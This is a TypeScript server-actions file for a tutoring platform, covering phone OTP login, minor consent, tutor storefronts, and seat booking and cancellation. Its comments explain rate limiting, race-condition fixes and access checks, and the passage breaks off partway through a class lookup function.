"use server";
import { eq, and, or, ne, sql, desc, ilike, inArray, isNull } from "drizzle-orm";
import { db, dbReady } from "@/lib/db";
import {
  profiles, tutors, classes, packs, bookings, consents, verificationDocs, reviews, notifications,
} from "@/lib/db/schema";
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import {
  normalizePhone, isValidPhone, createOtp, verifyOtpCode, otpCooldownRemaining,
  createSession, destroySession, getSession, setDemoCookie, checkRateLimit, clientIp,
} from "@/lib/auth";
import { demoClasses, demoEnabled } from "@/lib/demo";
import { revalidateTutor, revalidatePublicTutors } from "@/lib/cache";
import { smsEnabled, sendSms } from "@/lib/sms";
import { notify } from "@/lib/notify";
import { paymentsEnabled, tutorBalanceTnd } from "@/lib/payments";
import { liveRoomUrl, resolveMeetUrl } from "@/lib/live";
import {
  vText, vOptionalText, vInt, vPrice, vFutureDate, vOptionalUrl, vSlug, vRating, vPhone,
  vUuid, isUuid, safeFileName, vBirthYear, isMinorBirthYear,
} from "@/lib/validation";
import type {
  DashboardData, DashboardBooking, StudentDashboard, ClassItem, TutorVerification, PendingTutor,
  ExploreTutor, TutorReviews, NotificationItem, NotificationKind,
} from "@/lib/types";

type DocKind = "id_front" | "id_back" | "selfie" | "diploma" | "certificate" | "role_proof" | "other";

const DASH_MONTHS = ["JANV", "FÉVR", "MARS", "AVR", "MAI", "JUIN", "JUIL", "AOÛT", "SEPT", "OCT", "NOV", "DÉC"];
const CANCEL_WINDOW_MS = 24 * 60 * 60 * 1000; // the UI promises free cancellation up to 24h before

/* Server actions = the write/auth path. Callable from client components.
   In demo mode (no DATABASE_URL) they degrade gracefully so the UI still works.
   Every input goes through lib/validation.ts — actions are a public surface. */

export type ActionResult = { ok: boolean; demo?: boolean; slug?: string; error?: string };

/* Display name for public surfaces: "Amine Karoui" → "Amine K." (never the phone). */
function publicName(full: string | null): string | null {
  if (!full) return null;
  const parts = full.trim().split(/\s+/);
  if (parts.length < 2) return parts[0] ?? null;
  return `${parts[0]} ${parts[parts.length - 1][0].toUpperCase()}.`;
}
const initials = (name: string) => {
  const p = name.trim().split(/\s+/);
  return ((p[0]?.[0] ?? "") + (p.length > 1 ? p[p.length - 1][0] : "")).toUpperCase() || "?";
};

/* Recompute a tutor's public stats from real rows — never a fabricated number.
   rating = average of their reviews (0 if none); students = distinct students
   holding a live (non-cancelled) booking on one of their classes.

   RACE (fixed): this used to SELECT the aggregates, then UPDATE with the values it
   had read. Two students reviewing the same tutor at the same moment both read the
   pre-insert average and both wrote it back, so one review silently vanished from
   the public rating (lost update). Same shape for students_count.

   Fix: one statement. The aggregates are computed as correlated subqueries INSIDE
   the UPDATE, so Postgres evaluates them against the row's state at write time and
   concurrent writers serialize on the tutor row instead of clobbering each other.
   No read-then-write window left to lose.

   `tx` lets callers run this inside a transaction (reserveSeat / cancelBooking /
   createReview all do). Structurally typed on `update` alone so the same function
   accepts both the plain db handle and a drizzle transaction handle. */
type Updater = Pick<typeof db, "update">;

async function recomputeTutorStats(tutorId: string, tx: Updater = db): Promise<void> {
  await tx
    .update(tutors)
    .set({
      rating: sql`coalesce((
        select round(avg(${reviews.rating})::numeric, 1)
        from ${reviews} where ${reviews.tutorId} = ${tutorId}
      ), 0)`,
      studentsCount: sql`(
        select count(distinct ${bookings.studentId})::int
        from ${bookings}
        join ${classes} on ${bookings.classId} = ${classes.id}
        where ${classes.tutorId} = ${tutorId} and ${bookings.status} <> 'cancelled'
      )`,
    })
    .where(eq(tutors.id, tutorId));
}

/* ---------- Auth (phone OTP) ---------- */
export async function requestOtp(input: { phone: string }):
  Promise<{ ok: boolean; devCode?: string; demo?: boolean; error?: string; retryAfter?: number }> {
  if (!dbReady) return { ok: true, demo: true, devCode: "000000" };
  const phone = normalizePhone(input.phone);
  if (!isValidPhone(phone)) return { ok: false, error: "invalid-phone" };

  /* Anti-abuse, two layers:
       1. per-IP — the per-phone cooldown below is keyed on a value the ATTACKER
          supplies, so on its own it stops nothing: rotate the phone number and you
          can send unlimited SMS. Every message costs real money, so an unthrottled
          requestOtp is a direct billing-drain (and an SMS-bombing service pointed
          at arbitrary Tunisians, from our sender id).
       2. per-phone cooldown — protects one victim from repeat texts. */
  const ip = await checkRateLimit(`otp:req:ip:${clientIp()}`, 10, 10 * 60_000); // 10 sends / 10 min / IP
  if (!ip.ok) return { ok: false, error: "too-soon", retryAfter: ip.retryAfter };

  const wait = await otpCooldownRemaining(phone);
  if (wait > 0) return { ok: false, error: "too-soon", retryAfter: wait };

  // createOtp re-checks the cooldown under an advisory lock and returns null if a
  // concurrent call already minted a code for this phone (see lib/auth.ts).
  const code = await createOtp(phone);
  if (!code) return { ok: false, error: "too-soon", retryAfter: 60 };

  if (smsEnabled()) {
    const sent = await sendSms(phone, `Tnajem : ton code de connexion est ${code} (valable 5 min).`);
    // Production posture: the code is NEVER returned to the client. If SMS
    // delivery fails, surface an error so the user can retry — don't leak it.
    return sent ? { ok: true } : { ok: false, error: "sms-failed" };
  }
  // No SMS provider configured → dev mode only: surface the code on-screen.
  return { ok: true, devCode: code };
}

export async function verifyOtp(input: { phone: string; code: string; role: "tutor" | "student"; locale?: string; birthYear?: number }):
  Promise<{ ok: boolean; role?: string; needsConsent?: boolean; error?: string }> {
  if (!dbReady) {
    setDemoCookie(input.role === "tutor" ? "tutor" : "student");
    // Demo mode mirrors the real gate: a student is a minor unless they gave an
    // adult birth year, in which case consent is skipped.
    const demoMinor = input.role === "student" && isMinorBirthYear(vBirthYear(input.birthYear));
    return { ok: true, role: input.role, needsConsent: demoMinor };
  }
  const phone = normalizePhone(input.phone);
  if (!isValidPhone(phone)) return { ok: false, error: "invalid-code" };

  /* Brute-force budget. otp_codes.attempts caps guesses at 5 PER CODE, but that
     counter is reset by every new code — and requesting one only costs a 60s
     cooldown on that phone. So the pre-existing ceiling was really "5 guesses per
     minute, forever, per phone" against a 6-digit space, plus an unthrottled DB
     hit per guess. Two throttles close it:
       • per-phone: 10 guesses / 15 min — with the 5-per-code cap this leaves an
         attacker ~960 guesses/day against 1,000,000 codes (≈0.1%/day).
       • per-IP: stops one host from farming many phones in parallel.
     Both are in-process (see lib/auth.ts) — good enough for a single instance. */
  const perPhone = await checkRateLimit(`otp:vfy:phone:${phone}`, 10, 15 * 60_000);
  if (!perPhone.ok) return { ok: false, error: "invalid-code" }; // opaque on purpose
  const perIp = await checkRateLimit(`otp:vfy:ip:${clientIp()}`, 30, 15 * 60_000);
  if (!perIp.ok) return { ok: false, error: "invalid-code" };

  const valid = await verifyOtpCode(phone, (input.code || "").trim());
  if (!valid) return { ok: false, error: "invalid-code" };

  // `role` and `locale` are pgEnum/text columns and this is a public surface: an
  // arbitrary string would reach Postgres and blow up as "invalid input value for
  // enum user_role" (a 500 by input). Pin both to the allowed set.
  const role = input.role === "tutor" ? "tutor" : "student";
  const locale = input.locale === "ar" ? "ar" : "fr";
  // Self-reported at student signup; used ONLY for the minor-consent gate. Tutors
  // are verified adults (ID check), so we never record an age for them.
  const birthYear = role === "student" ? vBirthYear(input.birthYear) : null;

  let [profile] = await db.select().from(profiles).where(eq(profiles.phone, phone)).limit(1);
  if (!profile) {
    [profile] = await db.insert(profiles).values({ phone, role, locale, birthYear }).returning();
  } else if (profile.role === "student" && profile.birthYear == null && birthYear != null) {
    // One-time fill of an UNKNOWN age: lets a student who predates this field set it.
    // Never overwrites a known value, so a minor can't re-auth claiming to be an adult
    // to escape consent — the gate only ever relaxes from a real, on-file birth year.
    await db.update(profiles).set({ birthYear }).where(eq(profiles.id, profile.id));
    profile = { ...profile, birthYear };
  }
  // NOTE: an existing profile's role is deliberately NOT overwritten from input —
  // otherwise anyone could flip their own role by re-authenticating as the other one.
  await createSession(profile.id, profile.role);

  let needsConsent = false;
  // Guardian consent is a MINORS-only requirement (INPDP). Adults skip it; unknown
  // age fails safe (isMinorBirthYear treats null as minor), matching reserveSeat's gate.
  if (profile.role === "student" && isMinorBirthYear(profile.birthYear)) {
    const [c] = await db.select().from(consents).where(eq(consents.minorId, profile.id)).limit(1);
    needsConsent = !c;
  }
  return { ok: true, role: profile.role, needsConsent };
}

export async function logout(): Promise<{ ok: boolean }> {
  await destroySession();
  return { ok: true };
}

export async function saveConsent(input: { guardianName: string; guardianPhone: string }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };

  // This row is the legal record of parental consent (INPDP) — it must be real data.
  const name = vText(input.guardianName, { field: "guardian-name", max: 120, min: 2 });
  if (!name.ok) return { ok: false, error: name.error };
  const phone = vPhone(input.guardianPhone);
  if (!phone.ok) return { ok: false, error: phone.error };
  const normalized = normalizePhone(phone.value);
  if (!isValidPhone(normalized)) return { ok: false, error: "invalid-phone" };

  // `consents` has no unique key on minor_id, and this action had no dedupe — so a
  // client could POST it in a loop and write unbounded rows against one profile
  // (storage burn, and a legal record that no longer has a single answer for
  // "who consented?"). One consent per minor: re-submitting updates it in place.
  const [existing] = await db.select().from(consents)
    .where(eq(consents.minorId, session.profile.id)).limit(1);

  const values = {
    guardianName: name.value,
    guardianPhone: normalized,
    consentText: "Consentement du parent/tuteur pour un compte de moins de 18 ans (INPDP).",
  };

  if (existing) {
    await db.update(consents).set(values).where(eq(consents.id, existing.id));
  } else {
    await db.insert(consents).values({ minorId: session.profile.id, ...values });
  }
  return { ok: true };
}

export async function getMe():
  Promise<{ id: string; name: string | null; role: string; phone: string | null } | null> {
  const session = await getSession();
  if (!session) return null;
  const p = session.profile;
  return { id: p.id, name: p.fullName, role: p.role, phone: p.phone };
}

/* ---------- Tutor storefront (bound to the signed-in user) ---------- */
export async function createTutor(input: { name: string; subject: string; bio: string; slug: string }): Promise<ActionResult> {
  // `/[slug]` is a root catch-all → a reserved slug would shadow a real route. Validate first.
  const slug = vSlug(input.slug);
  if (!slug.ok) return { ok: false, error: slug.error };
  const name = vText(input.name, { field: "name", max: 80, min: 2 });
  if (!name.ok) return { ok: false, error: name.error };
  const subject = vText(input.subject, { field: "subject", max: 80 });
  if (!subject.ok) return { ok: false, error: subject.error };
  const bio = vOptionalText(input.bio, { field: "bio", max: 1000 });
  if (!bio.ok) return { ok: false, error: bio.error };

  if (!dbReady) return { ok: true, demo: true, slug: slug.value };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  const [bySlug] = await db.select().from(tutors).where(eq(tutors.slug, slug.value)).limit(1);
  if (bySlug && bySlug.profileId !== uid) return { ok: false, error: "slug-taken" };

  await db.update(profiles).set({ role: "tutor", fullName: name.value }).where(eq(profiles.id, uid));

  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, uid)).limit(1);
  const oldSlug = mine?.slug ?? null;
  if (mine) {
    await db.update(tutors)
      .set({ slug: slug.value, fullName: name.value, subject: subject.value, bio: bio.value })
      .where(eq(tutors.id, mine.id));
  } else {
    await db.insert(tutors)
      .values({ profileId: uid, slug: slug.value, fullName: name.value, subject: subject.value, bio: bio.value });
  }

  /* The storefront is ISR-cached per slug for 60s (lib/cache.ts). Bust BOTH slugs:
     the new one so the tutor sees their edit immediately, and the old one so a
     renamed tutor doesn't leave a stale page serving their previous content under
     a slug someone else can now claim. Non-throwing — a cache miss must never fail
     a write that already committed. (Not revalidatePublicTutors(): a tutor here is
     still `draft`, so nothing about the public set changed.) */
  if (oldSlug && oldSlug !== slug.value) revalidateTutor(oldSlug);
  revalidateTutor(slug.value);
  return { ok: true, slug: slug.value };
}

export async function createClass(input: {
  title: string; description?: string; scheduledAt: string;
  durationMin: number; priceTnd: number; seats: number; isFreeFirst: boolean;
  meetUrl?: string; whiteboardUrl?: string; quizUrl?: string;
}): Promise<ActionResult> {
  // Was accepting past dates, negative prices and arbitrary meetUrl strings (javascript: …).
  const title = vText(input.title, { field: "title", max: 120, min: 3 });
  if (!title.ok) return { ok: false, error: title.error };
  const description = vOptionalText(input.description, { field: "description", max: 1000 });
  if (!description.ok) return { ok: false, error: description.error };
  const when = vFutureDate(input.scheduledAt, { field: "date" });
  if (!when.ok) return { ok: false, error: when.error };
  const duration = vInt(input.durationMin, { field: "duration", min: 15, max: 480 });
  if (!duration.ok) return { ok: false, error: duration.error };
  const price = vPrice(input.priceTnd, { field: "price", max: 5000 });
  if (!price.ok) return { ok: false, error: price.error };
  const seats = vInt(input.seats, { field: "seats", min: 1, max: 500 });
  if (!seats.ok) return { ok: false, error: seats.error };
  const meetUrl = vOptionalUrl(input.meetUrl, { field: "meet-url" });
  if (!meetUrl.ok) return { ok: false, error: meetUrl.error };
  const whiteboardUrl = vOptionalUrl(input.whiteboardUrl, { field: "whiteboard-url" });
  if (!whiteboardUrl.ok) return { ok: false, error: whiteboardUrl.error };
  const quizUrl = vOptionalUrl(input.quizUrl, { field: "quiz-url" });
  if (!quizUrl.ok) return { ok: false, error: quizUrl.error };

  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return { ok: false, error: "no-storefront" };

  /* VERIFICATION GATE. A draft/pending tutor could already build a catalogue, and
     — the part that actually matters — so could a REJECTED one: nothing here ever
     looked at `status`. The content isn't publicly visible (getStorefront,
     getExploreTutors and getClass all hide non-verified tutors), but a tutor we
     have refused should not be able to keep stocking a storefront that goes live
     the instant anyone flips their status, and the class id is a bookable handle
     the moment it exists. Content creation belongs behind the same gate as the
     booking path. `createTutor` stays open — creating the storefront is the step
     that gets them INTO verification. */
  if (mine.status !== "verified") return { ok: false, error: "not-verified" };

  // meetUrl stays nullable: lib/live.ts derives a room from the class id when it's
  // empty, so the student's Join button is never dead.
  await db.insert(classes).values({
    tutorId: mine.id, title: title.value, description: description.value,
    scheduledAt: when.value, durationMin: duration.value,
    priceTnd: String(price.value), seats: seats.value, isFreeFirst: Boolean(input.isFreeFirst),
    meetUrl: meetUrl.value, whiteboardUrl: whiteboardUrl.value, quizUrl: quizUrl.value,
  });

  // The storefront lists this tutor's classes — drop its 60s ISR entry now.
  revalidateTutor(mine.slug);
  return { ok: true };
}

export async function createPack(input: { title: string; meta?: string; priceTnd: number }): Promise<ActionResult> {
  const title = vText(input.title, { field: "title", max: 120, min: 3 });
  if (!title.ok) return { ok: false, error: title.error };
  const meta = vOptionalText(input.meta, { field: "meta", max: 200 });
  if (!meta.ok) return { ok: false, error: meta.error };
  const price = vPrice(input.priceTnd, { field: "price", max: 5000 });
  if (!price.ok) return { ok: false, error: price.error };

  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return { ok: false, error: "no-storefront" };
  // Same verification gate as createClass — a rejected tutor does not get to keep
  // building a catalogue. See the comment there.
  if (mine.status !== "verified") return { ok: false, error: "not-verified" };

  await db.insert(packs).values({
    tutorId: mine.id, title: title.value, description: meta.value, priceTnd: String(price.value),
  });

  revalidateTutor(mine.slug); // packs are rendered on the public storefront
  return { ok: true };
}

/* ---------- Dashboard (real data for the signed-in tutor) ----------
   Returns null in demo mode or when signed out → the dashboard then shows
   its demo preview. Otherwise returns the tutor's real storefront + classes. */
export async function getDashboard(): Promise<DashboardData | null> {
  if (!dbReady) return null;
  const session = await getSession();
  if (!session) return null;
  const uid = session.profile.id;

  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, uid)).limit(1);
  if (!mine) {
    // Signed in but no storefront yet → prompt them to create one.
    return {
      name: session.profile.fullName, slug: null, has_storefront: false,
      balance_tnd: 0, paymentsEnabled: paymentsEnabled(), students: 0, sessions: 0,
      rating: 0, reviewCount: 0, status: "draft", classes: [], packs: [], bookings: [],
    };
  }

  // Bounded reads. These are per-tutor so they grow slowly, but "slowly" is still
  // unbounded: a tutor running weekly classes for two years has ~100 rows, and the
  // bookings join below multiplies by attendees. Caps keep one prolific tutor from
  // turning their own dashboard into a timeout.
  const rows = await db.select().from(classes)
    .where(eq(classes.tutorId, mine.id))
    .orderBy(desc(classes.scheduledAt))
    .limit(200);
  const mapped = rows.map((c) => {
    const d = new Date(c.scheduledAt);
    return {
      id: c.id,
      title: c.title,
      day: String(d.getDate()),
      month: DASH_MONTHS[d.getMonth()] ?? "",
      time: d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" }),
      price_tnd: Number(c.priceTnd),
      seats: c.seats ?? 0,
      seats_left: Math.max(0, (c.seats ?? 0) - (c.seatsTaken ?? 0)),
      status: c.status ?? "scheduled",
    };
  });

  const packRows = await db.select().from(packs).where(eq(packs.tutorId, mine.id)).limit(100);
  const mappedPacks = packRows.map((p) => ({
    id: p.id, title: p.title, meta: p.description ?? "", price_tnd: Number(p.priceTnd),
  }));

  // Who actually booked — the tutor needs names + phones to reach their students.
  const bookingRows = await db
    .select({
      bookingId: bookings.id,
      classId: classes.id,
      classTitle: classes.title,
      scheduledAt: classes.scheduledAt,
      isFree: bookings.isFree,
      status: bookings.status,
      bookedAt: bookings.createdAt,
      studentName: profiles.fullName,
      studentPhone: profiles.phone,
    })
    .from(bookings)
    // Single join — NOT a query per class. (Checked: getDashboard and
    // getStudentDashboard were already join-based; the only N+1 in this file was
    // getPendingVerifications, fixed above.)
    .innerJoin(classes, eq(bookings.classId, classes.id))
    .innerJoin(profiles, eq(bookings.studentId, profiles.id))
    .where(eq(classes.tutorId, mine.id))
    .orderBy(desc(bookings.createdAt))
    .limit(500);

  const mappedBookings: DashboardBooking[] = bookingRows.map((b) => ({
    bookingId: b.bookingId,
    classId: b.classId,
    classTitle: b.classTitle,
    studentName: b.studentName,
    studentPhone: b.studentPhone,
    bookedAt: new Date(b.bookedAt).toISOString(),
    classTs: new Date(b.scheduledAt).getTime(),
    isFree: Boolean(b.isFree),
    status: b.status ?? "reserved",
  }));

  const [revAgg] = await db
    .select({ n: sql<number>`count(*)::int` })
    .from(reviews)
    .where(eq(reviews.tutorId, mine.id));

  // Real balance from lib/payments.ts — 0 while payments are hard-disabled. Never fabricated.
  const balance = await tutorBalanceTnd(mine.id);

  return {
    name: mine.fullName ?? session.profile.fullName,
    slug: mine.slug,
    has_storefront: true,
    balance_tnd: balance,
    paymentsEnabled: paymentsEnabled(),
    students: mine.studentsCount ?? 0,
    sessions: rows.length,
    rating: Number(mine.rating ?? 0),
    reviewCount: revAgg?.n ?? 0,
    status: mine.status,
    classes: mapped,
    packs: mappedPacks,
    bookings: mappedBookings,
  };
}

/* ---------- Booking (student reserves a seat — free first session) ----------
   Payment-free for the pilot: reserves a seat and decrements availability.
   Idempotent — re-booking the same class returns { already: true }. */
export async function reserveSeat(input: { classId: string }):
  Promise<{ ok: boolean; demo?: boolean; already?: boolean; error?: string }> {
  if (!dbReady) return { ok: true, demo: true };
  const classId = vUuid(input.classId, { field: "class" });
  if (!classId.ok) return { ok: false, error: "not-found" };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  // Booking is a DB-write endpoint anyone with a session can hammer.
  const rl = await checkRateLimit(`book:${uid}`, 20, 60_000);
  if (!rl.ok) return { ok: false, error: "too-many-requests" };

  /* ---- GUARDIAN CONSENT (INPDP / Loi 2004-63) ----
     This was a promise, not a control. verifyOtp() returns `needsConsent` for a
     student with no `consents` row and the client sends them to /auth/consent,
     where saveConsent() records the guardian's name + phone — but NOTHING on the
     server ever checked that the row exists again. A student who closed that page,
     hit Back, or simply navigated straight to /checkout?class=<id> booked a seat
     with a real tutor and no consent on file. /privacy and the consent screen both
     tell users this consent is required before a minor uses the service, so the
     gap was: the legal record we publicly commit to collecting was optional in
     practice, and the only surface that could have enforced it — the booking, the
     moment the minor actually engages a tutor — didn't look.

     It looks now. Distinct error code so the UI can route to /auth/consent instead
     of showing "réessaie" for something retrying will never fix.

     Scoped to a MINOR student: consent is the guardian regime for under-18s, so an
     adult student (a real birth year that makes them >= 18) books without it, while
     a minor — or a student whose age we don't know (null birth year fails safe) —
     must have a consent row. `consents.minor_id` is only ever written for a student
     profile (saveConsent + verifyOtp); a tutor booking another tutor's class is not
     the minor this regime protects. Founder decision 2026-07-12: collect birth year
     at signup, gate consent under-18. */
  if (session.profile.role === "student" && isMinorBirthYear(session.profile.birthYear)) {
    const [consent] = await db
      .select({ id: consents.id })
      .from(consents)
      .where(eq(consents.minorId, uid))
      .limit(1);
    if (!consent) return { ok: false, error: "needs-consent" };
  }

  const [cls] = await db.select().from(classes).where(eq(classes.id, classId.value)).limit(1);
  if (!cls) return { ok: false, error: "not-found" };
  if (cls.status === "cancelled" || cls.status === "done") return { ok: false, error: "unavailable" };
  // A class in the past cannot be booked (there was no check at all — you could
  // reserve a seat in last month's session and then review it, see createReview).
  if (new Date(cls.scheduledAt).getTime() < Date.now()) return { ok: false, error: "unavailable" };

  /* The tutor must actually be verified. getStorefront() and getExploreTutors()
     both hide non-verified tutors, but NOTHING stopped a draft/pending/REJECTED
     tutor from handing out a direct /class/<id> link and taking real bookings from
     minors — the id is all you needed. The verification gate has to live on the
     booking path, not only on the discovery path. */
  const [tut] = await db.select().from(tutors).where(eq(tutors.id, cls.tutorId)).limit(1);
  if (!tut || tut.status !== "verified") return { ok: false, error: "unavailable" };
  if (tut.profileId === uid) return { ok: false, error: "own-class" }; // no self-booking

  /* ---- Atomic seat claim ----
     BEFORE: read seats_taken → compare to seats → UPDATE seats_taken = seats_taken + 1.
     Two students hitting "Réserver" on the last seat both read seats_taken = 19 of
     20, both passed the check, and both incremented → 21 bookings on a 20-seat
     class. Classic TOCTOU; on a "1ère séance gratuite" launch with a popular tutor
     this fires on day one.

     AFTER: the availability test IS the UPDATE's WHERE clause, evaluated by
     Postgres under a row lock. The loser's UPDATE matches zero rows and it gets
     "full" instead of a phantom seat. Booking insert + seat claim + tutor stats all
     ride one transaction, so a failure anywhere (e.g. the unique(class,student)
     constraint firing on a double-submit) rolls back the seat too — no leaked seats. */
  /* The transaction RETURNS the outcome rather than assigning to a captured
     variable. TypeScript's control-flow analysis does not track assignments made
     inside a callback (it cannot know the callback ran), so a captured
     `let outcome = "full"` stays narrowed to the literal "full" afterwards and
     every later comparison is a compile error. Returning the value keeps the
     type honest — and is clearer anyway. */
  type SeatOutcome = "booked" | "already" | "full";
  let outcome: SeatOutcome;
  try {
    outcome = await db.transaction(async (tx): Promise<SeatOutcome> => {
      const [existing] = await tx.select().from(bookings)
        .where(and(eq(bookings.classId, classId.value), eq(bookings.studentId, uid))).limit(1);
      if (existing && existing.status !== "cancelled") return "already";

      const claimed = await tx.update(classes)
        .set({ seatsTaken: sql`coalesce(${classes.seatsTaken}, 0) + 1` })
        .where(and(
          eq(classes.id, classId.value),
          sql`coalesce(${classes.seatsTaken}, 0) < coalesce(${classes.seats}, 0)`,
        ))
        .returning({ id: classes.id });
      if (claimed.length === 0) return "full"; // sold out — nobody oversells

      if (existing) {
        await tx.update(bookings).set({ status: "reserved" }).where(eq(bookings.id, existing.id));
      } else {
        await tx.insert(bookings).values({
          classId: classId.value, studentId: uid,
          isFree: Boolean(cls.isFreeFirst), status: "reserved",
        });
      }

      // students_count used to be a blind +1 per booking, so ONE student booking
      // three classes advertised the tutor as having three students. Recompute the
      // real distinct count instead (single statement, inside the tx).
      await recomputeTutorStats(cls.tutorId, tx);
      return "booked";
    });
  } catch {
    // unique(class_id, student_id) → a concurrent double-submit from the same
    // student. The tx rolled back, so the seat was NOT consumed. Idempotent success.
    return { ok: true, already: true };
  }

  if (outcome === "already") return { ok: true, already: true };
  if (outcome === "full") return { ok: false, error: "full" };

  /* seats_left just moved, and the storefront caches it for 60s — a class the
     cache still shows as "3 places" is how you get a student to the checkout of a
     sold-out session. Bust it. Outside the transaction (it commits above) and
     before the SMS: revalidateTutor() is a synchronous, non-throwing local call,
     unlike notify(). */
  revalidateTutor(tut.slug);

  // Tell both sides — AFTER the commit. notify() never throws, and it does SMS I/O:
  // running it inside the transaction would hold the seat lock open on the network
  // (a Twilio round-trip would pin one of the 10 pool connections — see lib/db/index.ts).
  const when = new Date(cls.scheduledAt);
  const whenLabel = when.toLocaleString("fr-FR", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" });

  await notify(uid, {
    kind: "booking_confirmed",
    title: "Place réservée ✅",
    body: `${cls.title} — ${whenLabel}${tut ? ` avec ${tut.fullName}` : ""}.`,
    href: `/class/${cls.id}`,
    sms: `Tnajem : ta place pour « ${cls.title} » le ${whenLabel} est réservée. Lien de la séance dans ton espace élève.`,
  });
  if (tut?.profileId) {
    await notify(tut.profileId, {
      kind: "new_booking",
      title: "Nouvelle réservation 🎉",
      body: `${session.profile.fullName ?? "Un élève"} a réservé « ${cls.title} » (${whenLabel}).`,
      href: "/dashboard",
    });
  }
  return { ok: true };
}

/* ---------- Cancellation (student) ----------
   The UI promises "annulation gratuite jusqu'à 24h avant" — enforce it here, not
   just in copy. Frees the seat back up and tells the tutor. */
export async function cancelBooking(input: { bookingId: string }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  const bookingId = vUuid(input.bookingId, { field: "booking" });
  if (!bookingId.ok) return { ok: false, error: "not-found" };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  const [bk] = await db.select().from(bookings).where(eq(bookings.id, bookingId.value)).limit(1);
  if (!bk) return { ok: false, error: "not-found" };
  // IDOR guard: the booking must be the caller's own. (Held — verified, not changed.)
  if (bk.studentId !== uid) return { ok: false, error: "forbidden" };
  if (bk.status === "cancelled") return { ok: true }; // idempotent fast path

  const [cls] = await db.select().from(classes).where(eq(classes.id, bk.classId)).limit(1);
  if (!cls) return { ok: false, error: "not-found" };

  const startsInMs = new Date(cls.scheduledAt).getTime() - Date.now();
  if (startsInMs < CANCEL_WINDOW_MS) return { ok: false, error: "too-late" };

  /* ---- Atomic seat release ----
     BEFORE: the "already cancelled?" check was a plain read, then three blind
     UPDATEs. Two concurrent cancels of the SAME booking both saw status='reserved',
     both ran the decrement, and the class gave back TWO seats for one departure —
     which oversells the class exactly like the reserveSeat race did (greatest(…,0)
     only stops the counter going negative; it does not stop it going too low).

     AFTER: the status flip is the guard. `WHERE id = ? AND status <> 'cancelled'`
     with RETURNING means only ONE writer ever gets a row back, and only that writer
     releases the seat. The second cancel matches nothing and no-ops. */
  let released = false;
  await db.transaction(async (tx) => {
    const done = await tx
      .update(bookings)
      .set({ status: "cancelled" })
      .where(and(
        eq(bookings.id, bk.id),
        sql`coalesce(${bookings.status}, 'reserved') <> 'cancelled'`,
      ))
      .returning({ id: bookings.id });
    if (done.length === 0) return; // lost the race — the other writer freed the seat

    await tx
      .update(classes)
      .set({ seatsTaken: sql`greatest(coalesce(${classes.seatsTaken}, 0) - 1, 0)` })
      .where(eq(classes.id, cls.id));
    // Distinct-student recount (not a blind -1, which under-counted a student who
    // still holds other bookings with this tutor).
    await recomputeTutorStats(cls.tutorId, tx);
    released = true;
  });

  if (!released) return { ok: true }; // idempotent: someone already cancelled it

  const [tut] = await db.select().from(tutors).where(eq(tutors.id, cls.tutorId)).limit(1);
  // The seat is back on sale — the cached storefront must stop saying it isn't.
  revalidateTutor(tut?.slug);

  if (tut?.profileId) {
    const whenLabel = new Date(cls.scheduledAt)
      .toLocaleString("fr-FR", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" });
    await notify(tut.profileId, {
      kind: "booking_cancelled",
      title: "Annulation",
      body: `${session.profile.fullName ?? "Un élève"} a annulé sa place pour « ${cls.title} » (${whenLabel}). La place est de nouveau libre.`,
      href: "/dashboard",
    });
  }
  return { ok: true };
}

/* ---------- Student dashboard (real reservations) ----------
   Returns null in demo mode / signed out → the student page shows demo data. */
export async function getStudentDashboard(): Promise<StudentDashboard | null> {
  if (!dbReady) return null;
  const session = await getSession();
  if (!session) return null;
  const uid = session.profile.id;

  const rows = await db
    .select({
      bookingId: bookings.id,
      isFree: bookings.isFree,
      classId: classes.id,
      title: classes.title,
      scheduledAt: classes.scheduledAt,
      status: classes.status,
      meetUrl: classes.meetUrl,
      replayUrl: classes.replayUrl,
      tutorName: tutors.fullName,
    })
    .from(bookings)
    .innerJoin(classes, eq(bookings.classId, classes.id))
    .innerJoin(tutors, eq(classes.tutorId, tutors.id))
    // Cancelled reservations disappear from the student's list (the seat is back on sale).
    .where(and(eq(bookings.studentId, uid), ne(bookings.status, "cancelled")))
    .orderBy(desc(classes.scheduledAt))
    .limit(300); // one join, bounded — no per-booking query

  const items = rows.map((r) => {
    const d = new Date(r.scheduledAt);
    return {
      bookingId: r.bookingId,
      classId: r.classId,
      title: r.title,
      tutorName: r.tutorName,
      day: String(d.getDate()),
      month: DASH_MONTHS[d.getMonth()] ?? "",
      time: d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" }),
      ts: d.getTime(),
      isFree: Boolean(r.isFree),
      status: r.status ?? "scheduled",
      // Never blank: falls back to the room derived from the class id (lib/live.ts).
      meetUrl: resolveMeetUrl({ id: r.classId, meetUrl: r.meetUrl }),
      replayUrl: r.replayUrl ?? undefined,
    };
  });

  const cutoff = Date.now() - 2 * 60 * 60 * 1000; // keep a class "upcoming" ~2h past start
  const upcoming = items.filter((i) => i.ts >= cutoff).sort((a, b) => a.ts - b.ts);
  const past = items.filter((i) => i.ts < cutoff).sort((a, b) => b.ts - a.ts);
  return { upcoming, past };
}

/* ---------- Single class read (for class detail / checkout / live) ----------
   Demo mode → demo class; real mode → the row by id, or null if missing. */
export async function getClass(id: string): Promise<ClassItem | null> {
  if (!dbReady) return demoClasses.find((c) => c.id === id) ?? demoClasses[0] ?? null;
  if (!isUuid(id)) return null;

